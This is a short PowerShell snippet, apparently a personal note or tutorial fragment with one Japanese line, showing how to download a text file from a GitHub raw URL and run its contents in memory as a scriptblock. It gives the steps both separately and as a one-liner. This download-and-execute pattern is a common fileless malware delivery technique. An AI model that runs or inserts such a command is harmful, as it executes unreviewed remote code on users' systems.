$c = (curl -URI https://raw.githubusercontent.com/kalaxity/memory_exec_test/main/test.txt).content
$s = [scriptblock]::create($c)
$s.invoke()

もしくはそれらをまとめて一行で

([scriptblock]::create((curl -URI https://raw.githubusercontent.com/kalaxity/memory_exec_test/main/test.txt).content)).invoke()
